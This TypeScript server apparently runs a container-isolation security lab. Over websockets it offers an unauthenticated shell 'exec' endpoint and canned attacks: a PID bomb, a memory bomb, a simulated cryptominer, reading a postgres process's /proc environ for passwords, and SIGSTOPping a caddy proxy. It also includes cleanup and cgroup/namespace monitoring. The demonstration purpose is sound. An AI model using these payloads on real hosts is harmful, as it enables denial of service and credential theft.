import { createServer } from 'node:http';
import { execFileSync, spawn } from 'node:child_process';
import { mkdirSync, readFileSync, readlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { WebSocketServer } from 'ws';
import type { IncomingMessage, ServerResponse } from 'node:http';
import type { RawData, WebSocket } from 'ws';
import type { CgroupEvidence, CustomerSample, ProcessEvidence, RuntimeEvidence } from './src/lib/types/lab';

type SvelteKitHandler = (request: IncomingMessage, response: ServerResponse) => void;
type TerminalPayload = {
	type?: unknown;
	command?: unknown;
	count?: unknown;
	mb?: unknown;
	seconds?: unknown;
	workers?: unknown;
};
type ActivePayload = {
	type: string;
	label: string;
	startedAt: string;
	expiresAt?: string;
};

const handlerModulePath = './build/handler.js';
const { handler } = (await import(handlerModulePath)) as { handler: SvelteKitHandler };

const host = process.env.HOST || '0.0.0.0';
const port = Number(process.env.PORT || 8080);
const dataDir = process.env.LAB_DATA_DIR || '/app/data';
const victimCheckoutUrl = process.env.VICTIM_CHECKOUT_URL || 'http://victim-checkout:3000/checkout';
const customerProbeIntervalMs = clamp(Number(process.env.CUSTOMER_PROBE_INTERVAL_MS || 750), 250, 5000);
const monitorSockets = new Set<WebSocket>();
const customerSockets = new Set<WebSocket>();
let memoryHold: Buffer[] = [];
let terminalActionRunning = false;
let activePayload: ActivePayload | null = null;
let activePayloadTimer: ReturnType<typeof setTimeout> | null = null;
let stopRequested = false;

const payloadActions = new Set(['pid-bomb', 'memory-bomb', 'cpu-burn', 'cpu-blast', 'sabotage-proxy']);
const payloadLabels: Record<string, string> = {
	'pid-bomb': 'PID bomb',
	'memory-bomb': 'Memory blast',
	'cpu-burn': 'CPU burn',
	'cpu-blast': 'Cryptominer',
	'sabotage-proxy': 'Reverse-proxy sabotage'
};

const server = createServer((request, response) => {
	handler(request, response);
});

const terminalServer = new WebSocketServer({ noServer: true });
const monitorServer = new WebSocketServer({ noServer: true });
const customerServer = new WebSocketServer({ noServer: true });

server.on('upgrade', (request, socket, head) => {
	const url = new URL(request.url || '/', `http://${request.headers.host || 'localhost'}`);

	if (url.pathname === '/ws/terminal') {
		terminalServer.handleUpgrade(request, socket, head, (websocket) => {
			terminalServer.emit('connection', websocket, request);
		});
		return;
	}

	if (url.pathname === '/ws/monitor') {
		monitorServer.handleUpgrade(request, socket, head, (websocket) => {
			monitorServer.emit('connection', websocket, request);
		});
		return;
	}

	if (url.pathname === '/ws/customer') {
		customerServer.handleUpgrade(request, socket, head, (websocket) => {
			customerServer.emit('connection', websocket, request);
		});
		return;
	}

	socket.destroy();
});

terminalServer.on('connection', (socket) => {
	line(socket, 'system', 'connected to dokuru-lab terminal websocket\n');
	line(socket, 'system', 'commands run inside the vulnerable container runtime\n');
	sendActivePayload(socket);

	socket.on('message', (raw) => {
		void handleTerminalMessage(socket, raw);
	});

});

monitorServer.on('connection', (socket) => {
	monitorSockets.add(socket);
	send(socket, 'monitor.evidence', { runtime: runtimeEvidence() });
	socket.on('close', () => {
		monitorSockets.delete(socket);
	});
});

customerServer.on('connection', (socket) => {
	customerSockets.add(socket);
	send(socket, 'customer.config', { url: victimCheckoutUrl });
	void sendCustomerSample(socket);
	socket.on('close', () => {
		customerSockets.delete(socket);
	});
});

setInterval(() => {
	const payload = { runtime: runtimeEvidence() };
	for (const socket of monitorSockets) {
		send(socket, 'monitor.evidence', payload);
	}
}, 500);

setInterval(() => {
	void broadcastCustomerSample();
}, customerProbeIntervalMs);

server.listen(port, host, () => {
	console.log(`Listening on http://${host}:${port}`);
});

async function handleTerminalMessage(socket: WebSocket, raw: RawData): Promise<void> {
	let message: TerminalPayload;
	try {
		const parsed = JSON.parse(String(raw));
		message = isRecord(parsed) ? parsed : {};
	} catch {
		line(socket, 'stderr', 'invalid terminal message: expected JSON\n');
		return;
	}

	const type = String(message.type || '');

	if (type === 'stop-payloads') {
		send(socket, 'terminal.start', { action: type });
		try {
			await runStopPayloads(socket);
			send(socket, 'terminal.exit', { action: type, code: 0 });
		} catch (error) {
			line(socket, 'stderr', `${error instanceof Error ? error.message : String(error)}\n`);
			send(socket, 'terminal.exit', { action: type, code: 1 });
		}
		return;
	}

	if (terminalActionRunning) {
		line(socket, 'stderr', `terminal is busy running another action; wait or stop the active payload\n`);
		send(socket, 'terminal.exit', { action: type, code: 1 });
		return;
	}

	if (payloadActions.has(type) && activePayload) {
		line(socket, 'stderr', `${activePayload.label} is still active; stop it before starting another payload\n`);
		sendActivePayload(socket);
		send(socket, 'terminal.exit', { action: type, code: 1 });
		return;
	}

	terminalActionRunning = true;
	stopRequested = false;
	send(socket, 'terminal.start', { action: type });

	if (payloadActions.has(type)) {
		activatePayload(type, payloadLabels[type] || type, payloadDurationMs(type, message));
	}

	try {
		if (type === 'exec') {
			await runShell(socket, String(message.command || 'id').trim().slice(0, 1000) || 'id');
		} else if (type === 'probe') {
			await runProbe(socket);
		} else if (type === 'pid-bomb') {
			await runPidBomb(socket, message.count);
		} else if (type === 'memory-bomb') {
			await runMemoryBomb(socket, message.mb);
		} else if (type === 'cpu-burn') {
			await runCpuBurn(socket, message.seconds);
		} else if (type === 'cpu-blast') {
			await runCpuBlast(socket, message.seconds, message.workers);
		} else if (type === 'customer-probe') {
			await runCustomerProbe(socket);
		} else if (type === 'steal-secrets') {
			await runStealSecrets(socket);
		} else if (type === 'sabotage-proxy') {
			await runSabotageProxy(socket, message.seconds);
		} else if (type === 'cleanup') {
			await runCleanup(socket);
		} else {
			line(socket, 'stderr', `unknown action: ${type}\n`);
			send(socket, 'terminal.exit', { action: type, code: 1 });
			return;
		}

		send(socket, 'terminal.exit', { action: type, code: 0 });
	} catch (error) {
		line(socket, 'stderr', `${error instanceof Error ? error.message : String(error)}\n`);
		send(socket, 'terminal.exit', { action: type, code: 1 });
	} finally {
		terminalActionRunning = false;
	}
}

function runShell(socket: WebSocket, command: string, timeoutMs = 15_000): Promise<void> {
	return new Promise((resolve) => {
		line(socket, 'system', `$ ${command}\n`);
		const child = spawn('/bin/sh', ['-lc', command], {
			env: process.env,
			cwd: process.cwd(),
			stdio: ['ignore', 'pipe', 'pipe']
		});

		const timeout = setTimeout(() => {
			line(socket, 'stderr', `command timed out after ${timeoutMs}ms; killing pid ${child.pid}\n`);
			child.kill('SIGKILL');
		}, timeoutMs);

		child.stdout.on('data', (chunk: Buffer) => line(socket, 'stdout', chunk.toString()));
		child.stderr.on('data', (chunk: Buffer) => line(socket, 'stderr', chunk.toString()));
		child.on('error', (error) => line(socket, 'stderr', `${error.message}\n`));
		child.on('close', (code, signal) => {
			clearTimeout(timeout);
			line(socket, 'system', `process exited code=${code ?? 'null'} signal=${signal ?? 'none'}\n`);
			resolve();
		});
	});
}

async function runProbe(socket: WebSocket): Promise<void> {
	ensureDataDir();
	const path = join(dataDir, 'recovery-probe.txt');
	const payload = `probe=${new Date().toISOString()}\n`;
	line(socket, 'system', `$ printf %q ${JSON.stringify(payload.trim())} > ${path}\n`);
	writeFileSync(path, payload);
	line(socket, 'stdout', `wrote ${path}\n`);
	line(socket, 'stdout', payload);
	line(socket, 'stdout', `uid_map=${readFirst(['/proc/self/uid_map']).replaceAll('\n', ' | ')}\n`);
}

async function runPidBomb(socket: WebSocket, rawCount: unknown): Promise<void> {
	const count = clamp(Number(rawCount || 120), 1, 500);
	line(socket, 'system', `$ dokuru-lab pid-bomb --count ${count}\n`);
	let spawned = 0;

	for (let index = 0; index < count; index += 1) {
		if (stopRequested) {
			line(socket, 'stderr', 'pid bomb stopped by user\n');
			break;
		}

		try {
			const child = spawn(
				process.execPath,
				['-e', "process.title='dokuru_pid_slp'; setTimeout(() => {}, 60000);"],
				{ detached: true, stdio: 'ignore' }
			);
			child.unref();
			spawned += 1;
			line(socket, 'stdout', `[${String(index + 1).padStart(3, '0')}] spawned sleeper pid=${child.pid}\n`);
			if ((index + 1) % 20 === 0) {
				line(socket, 'stdout', cgroupSummary());
			}
			await delay(8);
		} catch (error) {
			line(socket, 'stderr', `spawn failed at ${index + 1}: ${error instanceof Error ? error.message : String(error)}\n`);
			break;
		}
	}

	line(socket, 'stdout', `spawned ${spawned}/${count} requested sleeper processes\n`);
	line(socket, 'stdout', cgroupSummary());
}

async function runMemoryBomb(socket: WebSocket, rawMb: unknown): Promise<void> {
	const mb = clamp(Number(rawMb || 128), 1, 1536);
	line(socket, 'system', `$ dokuru-lab memory-bomb --mb ${mb}\n`);

	for (let index = 0; index < mb; index += 1) {
		if (stopRequested) {
			line(socket, 'stderr', 'memory blast stopped by user\n');
			break;
		}

		memoryHold.push(Buffer.alloc(1024 * 1024, 'a'));
		if ((index + 1) % 16 === 0 || index + 1 === mb) {
			line(socket, 'stdout', `allocated ${index + 1} MiB; held=${memoryHold.length} MiB; ${memorySummary()}\n`);
			await delay(20);
		}
	}
}

async function runCpuBurn(socket: WebSocket, rawSeconds: unknown): Promise<void> {
	const seconds = clamp(Number(rawSeconds || 5), 1, 30);
	line(socket, 'system', `$ dokuru-lab cpu-burn --seconds ${seconds}\n`);
	const script = `process.title='dokuru_cpu_burn'; const crypto = require('node:crypto'); const end = Date.now() + ${seconds} * 1000; let ops = 0; let last = Date.now(); console.log('cpu burn started for ${seconds}s'); while (Date.now() < end) { for (let i = 0; i < 5000; i++) crypto.createHash('sha256').update(String(ops++)).digest('hex'); if (Date.now() - last >= 500) { console.log('ops=' + ops); last = Date.now(); } } console.log('cpu burn done ops=' + ops);`;
	await new Promise<void>((resolve) => {
		const child = spawn(process.execPath, ['-e', script], { stdio: ['ignore', 'pipe', 'pipe'] });
		child.stdout.on('data', (chunk: Buffer) => line(socket, 'stdout', chunk.toString()));
		child.stderr.on('data', (chunk: Buffer) => line(socket, 'stderr', chunk.toString()));
		child.on('close', (code, signal) => {
			line(socket, 'system', `cpu burner exited code=${code ?? 'null'} signal=${signal ?? 'none'}\n`);
			resolve();
		});
	});
}

async function runCpuBlast(socket: WebSocket, rawSeconds: unknown, rawWorkers: unknown): Promise<void> {
	const seconds = clamp(Number(rawSeconds || 25), 1, 60);
	const workers = clamp(Number(rawWorkers || 4), 1, 8);
	line(socket, 'system', `$ dokuru-lab cryptominer --workers ${workers} --seconds ${seconds}\n`);

	const script = `process.title='dokuru_cpu_burn'; const crypto = require('node:crypto'); const end = Date.now() + ${seconds} * 1000; let ops = 0; while (Date.now() < end) { for (let i = 0; i < 5000; i++) crypto.createHash('sha256').update(String(ops++)).digest('hex'); }`;
	let spawned = 0;

	for (let index = 0; index < workers; index += 1) {
		try {
			const child = spawn(process.execPath, ['-e', script], { detached: true, stdio: 'ignore' });
			child.unref();
			spawned += 1;
			line(socket, 'stdout', `[miner ${index + 1}/${workers}] pid=${child.pid}\n`);
		} catch (error) {
			line(socket, 'stderr', `failed to spawn miner ${index + 1}: ${error instanceof Error ? error.message : String(error)}\n`);
		}
	}

	await delay(250);
	line(socket, 'stdout', `spawned ${spawned}/${workers} CPU miners for ${seconds}s; watch Customer Live View for latency spikes\n`);
	line(socket, 'stdout', cgroupSummary());
}

async function runCustomerProbe(socket: WebSocket): Promise<void> {
	line(socket, 'system', `$ curl -sS -m 2 ${victimCheckoutUrl}\n`);
	const sample = await directCustomerProbe();
	if (sample.ok) {
		line(socket, 'stdout', `customer OK status=${sample.status} latency=${sample.latency_ms}ms body=${sample.body}\n`);
	} else {
		line(socket, 'stderr', `customer FAIL status=${sample.status} latency=${sample.latency_ms}ms error=${sample.error}\n`);
	}
}

async function runStealSecrets(socket: WebSocket): Promise<void> {
	const command = [
		'set -eu',
		"echo '[1] visible postgres processes from inside attacker container'",
		"ps -eo pid,user,comm,args | grep -E '[p]ostgres|[v]ictim-secrets' | head -20 || true",
		"pid=$(pgrep -of 'postgres' || true)",
		"if [ -z \"$pid\" ]; then echo 'no postgres PID visible; PID namespace is isolated'; exit 2; fi",
		'echo "target_pid=$pid"',
		"echo '[2] reading /proc/$pid/environ'",
		"if [ ! -e \"/proc/$pid/environ\" ]; then echo 'environ file missing'; exit 3; fi",
		"tr '\\0' '\\n' < \"/proc/$pid/environ\" | grep -E 'POSTGRES|PASSWORD|USER|DB' || true"
	].join('\n');

	await runShell(socket, command, 8_000);
}

async function runSabotageProxy(socket: WebSocket, rawSeconds: unknown): Promise<void> {
	const seconds = clamp(Number(rawSeconds || 6), 3, 15);
	const command = [
		'set -u',
		`echo '[1] scheduling automatic caddy resume in ${seconds}s'`,
		`(sleep ${seconds}; pkill -CONT -x caddy 2>/dev/null || true; echo 'auto-resume attempted at '$(date -Is)) >/tmp/dokuru-caddy-resume.log 2>&1 &`,
		"echo '[2] stopping caddy from inside the attacker container'",
		'pkill -STOP -x caddy',
		'code=$?',
		"if [ \"$code\" -eq 0 ]; then echo 'caddy stopped; browser may disconnect until auto-resume runs'; else echo 'no caddy process visible; PID namespace is likely isolated'; fi",
		'exit 0'
	].join('\n');

	await runShell(socket, command, 4_000);
}

async function runCleanup(socket: WebSocket): Promise<void> {
	stopRequested = true;
	clearActivePayload();
	line(socket, 'system', 'dropping held memory buffers in the server process\n');
	memoryHold = [];
	await runShell(
		socket,
		"pkill -f '[d]okuru_pid_slp|[d]okuru_pid_bomb_sleep|[d]okuru_cpu_burn' 2>&1 || true",
		5_000
	);
	line(socket, 'stdout', `held memory cleared; ${cgroupSummary()}`);
}

async function runStopPayloads(socket: WebSocket): Promise<void> {
	stopRequested = true;
	clearActivePayload();
	line(socket, 'system', '$ dokuru-lab stop-payloads\n');
	line(socket, 'system', 'dropping held memory buffers in the server process\n');
	memoryHold = [];
	await runShell(
		socket,
		"pkill -f '[d]okuru_pid_slp|[d]okuru_pid_bomb_sleep|[d]okuru_cpu_burn' 2>&1 || true; pkill -CONT -x caddy 2>&1 || true",
		5_000
	);
	line(socket, 'stdout', `active payload stopped; held memory cleared; ${cgroupSummary()}`);
}

function activatePayload(type: string, label: string, durationMs: number | null): void {
	const startedAt = new Date();
	activePayload = {
		type,
		label,
		startedAt: startedAt.toISOString()
	};

	if (activePayloadTimer) {
		clearTimeout(activePayloadTimer);
		activePayloadTimer = null;
	}

	if (durationMs !== null && Number.isFinite(durationMs) && durationMs > 0) {
		activePayload.expiresAt = new Date(startedAt.getTime() + durationMs).toISOString();
		activePayloadTimer = setTimeout(() => clearActivePayload(type), durationMs + 500);
	}

	broadcastActivePayload();
}

function clearActivePayload(expectedType: string | null = null): void {
	if (expectedType && activePayload?.type !== expectedType) return;

	if (activePayloadTimer) {
		clearTimeout(activePayloadTimer);
		activePayloadTimer = null;
	}

	if (!activePayload) return;
	activePayload = null;
	broadcastActivePayload();
}

function payloadDurationMs(type: string, message: TerminalPayload): number | null {
	if (type === 'cpu-blast') return clamp(Number(message.seconds || 25), 1, 60) * 1000;
	if (type === 'cpu-burn') return clamp(Number(message.seconds || 5), 1, 30) * 1000;
	if (type === 'pid-bomb') return 60_000;
	if (type === 'sabotage-proxy') return clamp(Number(message.seconds || 6), 3, 15) * 1000;
	return null;
}

function sendActivePayload(socket: WebSocket): void {
	send(socket, 'terminal.payload', { payload: activePayload });
}

function broadcastActivePayload(): void {
	for (const socket of terminalServer.clients) {
		sendActivePayload(socket);
	}
}

async function broadcastCustomerSample(): Promise<void> {
	if (customerSockets.size === 0) return;
	const sample = await customerProbe();
	for (const socket of customerSockets) {
		send(socket, 'customer.sample', { sample });
	}
}

async function sendCustomerSample(socket: WebSocket): Promise<void> {
	const sample = await customerProbe();
	send(socket, 'customer.sample', { sample });
}

async function customerProbe(): Promise<CustomerSample> {
	const trafficSample = customerTrafficSample();
	if (trafficSample) return trafficSample;
	return directCustomerProbe();
}

async function directCustomerProbe(): Promise<CustomerSample> {
	const started = Date.now();
	const controller = new AbortController();
	const timeout = setTimeout(() => controller.abort(), 1800);

	try {
		const response = await fetch(victimCheckoutUrl, { signal: controller.signal });
		const body = (await response.text()).trim().slice(0, 240);
		return {
			ok: response.ok,
			status: response.status,
			latency_ms: Date.now() - started,
			url: victimCheckoutUrl,
			body
		};
	} catch (error) {
		return {
			ok: false,
			status: 'ERR',
			latency_ms: Date.now() - started,
			url: victimCheckoutUrl,
			error: error instanceof Error ? error.message : String(error)
		};
	} finally {
		clearTimeout(timeout);
	}
}

function customerTrafficSample(): CustomerSample | null {
	const path = join(dataDir, 'customer-traffic.log');

	try {
		const lines = readFileSync(path, 'utf8')
			.trim()
			.split('\n')
			.filter(Boolean);
		const latest = lines.at(-1);
		if (!latest) return null;

		const match = /^(\S+)\s+status=([^\s]+)\s+latency_s=([0-9.]+)(?:\s+error=(.*))?$/.exec(latest);
		if (!match) return null;

		const observedAt = match[1];
		const statusText = match[2];
		const latencyMs = Math.round(Number(match[3]) * 1000);
		const status = /^\d+$/.test(statusText) ? Number(statusText) : statusText;
		const timestamp = Date.parse(observedAt);
		const ageMs = Number.isFinite(timestamp) ? Date.now() - timestamp : 0;

		if (ageMs > 5000) {
			return {
				ok: false,
				status: 'STALE',
				latency_ms: ageMs,
				url: victimCheckoutUrl,
				source: 'customer-traffic',
				observed_at: observedAt,
				error: `customer-traffic sample is stale (${ageMs}ms old)`
			};
		}

		return {
			ok: typeof status === 'number' && status >= 200 && status < 400,
			status,
			latency_ms: Number.isFinite(latencyMs) ? latencyMs : 0,
			url: victimCheckoutUrl,
			source: 'customer-traffic',
			observed_at: observedAt,
			error: match[4]
		};
	} catch {
		return null;
	}
}

function runtimeEvidence(): RuntimeEvidence {
	return {
		id: commandSync('id'),
		uid_map: readFirst(['/proc/self/uid_map']),
		gid_map: readFirst(['/proc/self/gid_map']),
		pid_namespace: namespaceLink('/proc/self/ns/pid'),
		user_namespace: namespaceLink('/proc/self/ns/user'),
		uts_namespace: namespaceLink('/proc/self/ns/uts'),
		cgroup: cgroupEvidence(),
		processes: processEvidence()
	};
}

function cgroupEvidence(): CgroupEvidence {
	return {
		pids_current: readFirst(['/sys/fs/cgroup/pids.current', '/sys/fs/cgroup/pids/pids.current']),
		pids_max: readFirst(['/sys/fs/cgroup/pids.max', '/sys/fs/cgroup/pids/pids.max']),
		memory_current: readFirst(['/sys/fs/cgroup/memory.current', '/sys/fs/cgroup/memory/memory.usage_in_bytes']),
		memory_max: readFirst(['/sys/fs/cgroup/memory.max', '/sys/fs/cgroup/memory/memory.limit_in_bytes']),
		cpu_weight: readFirst(['/sys/fs/cgroup/cpu.weight']),
		cpu_max: readFirst(['/sys/fs/cgroup/cpu.max']),
		cpu_shares_v1: readFirst(['/sys/fs/cgroup/cpu/cpu.shares'])
	};
}

function processEvidence(): ProcessEvidence {
	return {
		process_count: commandSync("ps -eo pid= | wc -l | tr -d ' '"),
		pid_bomb_sleepers: commandSync("pgrep -fc '[d]okuru_pid_slp|[d]okuru_pid_bomb_sleep' 2>/dev/null || true"),
		cpu_burners: commandSync("pgrep -fc '[d]okuru_cpu_burn' 2>/dev/null || true"),
		top_processes: commandSync('ps -eo pid,ppid,user,comm | head -12')
	};
}

function cgroupSummary(): string {
	const cgroup = cgroupEvidence();
	return `pids.current=${cgroup.pids_current} pids.max=${cgroup.pids_max} memory.current=${cgroup.memory_current} memory.max=${cgroup.memory_max} cpu.weight=${cgroup.cpu_weight}\n`;
}

function memorySummary(): string {
	const cgroup = cgroupEvidence();
	return `memory.current=${cgroup.memory_current} memory.max=${cgroup.memory_max}`;
}

function readFirst(paths: string[]): string {
	for (const path of paths) {
		try {
			return readFileSync(path, 'utf8').trim();
		} catch {}
	}
	return 'unavailable';
}

function commandSync(command: string): string {
	return spawnSyncText('/bin/sh', ['-lc', command]);
}

function spawnSyncText(command: string, args: string[]): string {
	try {
		return execFileSync(command, args, { encoding: 'utf8', timeout: 3000 }).trim();
	} catch (error) {
		return error instanceof Error ? error.message : String(error);
	}
}

function namespaceLink(path: string): string {
	try {
		return readlinkSync(path);
	} catch {
		return 'unavailable';
	}
}

function ensureDataDir(): void {
	mkdirSync(dataDir, { recursive: true });
}

function send(socket: WebSocket, type: string, payload: Record<string, unknown> = {}): void {
	if (socket.readyState !== 1) return;
	socket.send(JSON.stringify({ type, ...payload, at: new Date().toISOString() }));
}

function line(socket: WebSocket, stream: string, text: string): void {
	send(socket, 'terminal.line', { stream, text });
}

function delay(ms: number): Promise<void> {
	return new Promise((resolve) => setTimeout(resolve, ms));
}

function isRecord(value: unknown): value is Record<string, unknown> {
	return typeof value === 'object' && value !== null;
}

function clamp(value: number, min: number, max: number): number {
	if (!Number.isFinite(value)) return min;
	return Math.min(Math.max(Math.trunc(value), min), max);
}
